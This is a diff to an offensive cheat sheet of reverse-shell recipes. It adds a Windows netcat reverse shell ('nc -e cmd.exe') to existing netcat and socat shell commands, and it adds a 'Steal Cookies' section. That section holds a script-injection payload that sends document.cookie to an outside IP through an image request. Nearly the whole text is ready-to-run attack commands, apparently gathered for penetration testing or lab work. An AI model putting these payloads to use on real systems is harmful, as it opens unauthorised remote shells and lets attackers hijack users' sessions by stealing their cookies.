@@ -5,7 +5,8 @@ Recipes for reverse shells from A to target B:
 
 ### Netcat
 A: `nc -nlvp 4444`  
-B: `nc -nv $A_IP $PORT -e /bin/bash`  
+B (Linux): `nc -nv $A_IP $PORT -e /bin/bash`  
+B (Windows): `nc -nv $A_IP $PORT -e cmd.exe`  
 
 ### Socat
 #### Unencrypted
@@ -45,3 +46,7 @@ B machine (Windows): `socat OPENSSL-LISTEN:$PORT,cert=cert.pem,verify=0,fork EXE
 
 ## Get Public IP
 To get your public IP address on Linux run `dig +short myip.opendns.com @resolver1.opendns.com`  
+
+## Steal Cookies
+`<script>new Image().src="http://IP/random.jpg?output="+document.cookie;</script>`
+
